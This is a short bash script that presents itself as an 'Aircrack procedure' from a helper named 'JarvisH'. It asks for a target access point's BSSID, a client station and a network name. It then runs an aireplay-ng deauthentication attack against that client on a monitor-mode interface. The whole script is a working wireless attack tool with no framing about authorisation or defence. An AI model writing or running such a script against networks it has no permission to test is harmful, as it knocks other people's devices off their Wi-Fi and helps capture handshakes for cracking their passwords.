#!/bin/bash

echo Now loading Aircrack procedure
sleep 2
echo -e "\e[0;33mJarvisH: what is BBSID?"
read BBSID
echo -e "\e[0;33mJarvisH: Now the station"
read STATION
echo -e "\e[0;33mJarvisH: Now the Name"
read NAME
sleep 2
aireplay-ng -0 3 -a $BBSID -c $STATION -e $NAME --ignore-negative-one mon0
sleep 2


